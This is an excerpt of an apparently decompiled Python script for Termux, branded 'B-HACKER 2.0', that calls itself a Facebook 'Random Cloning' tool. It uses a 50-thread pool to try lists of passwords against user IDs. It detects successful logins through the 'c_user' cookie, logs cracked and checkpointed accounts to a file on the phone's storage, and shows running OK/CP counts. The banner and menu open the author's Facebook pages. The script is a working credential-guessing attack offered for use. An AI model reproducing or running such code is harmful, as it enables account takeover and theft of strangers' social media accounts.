...
def o():
    ...
    jalan('\t   \033[38;5;192m👾B-HACKER NUMBAR TOOLS👾')
    ...
    if None == 'B':
        ...
        os.system('xdg-open https://www.facebook.com/paglir.pagol.37853')

        return None

    if None == 'C':

        os.system('xdg-open https://facebook.com/groups/1733600866707914/')

        return None

    if None == 'D':

        os.system('xdg-open https://m.me/j/AbZJhVphy3vwOTQk/')
...
logo =                                          ("""   
  ...
  \033[1;92mB-HACKER-2.0
         
 \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mB-HACKER 2.0   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m Hridoy Chowdury Raihan               \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mKgB-HACKER-20              \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mB-HACKER                  \033[1;93m|
 ...
 \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m B-HACKER TERMUX HELPING ZONE....
 \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××\n""")
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(' \033[38;5;45mS-Saimon \033[38;5;46m/ \033[38;5;45mH-B-HACKER\033[38;5;45m We Are Brother💚')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print( ' \033[38;5;196m[B-HACKER-CP💔]  ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/B-HACKER-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r %s[B-HACKER] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
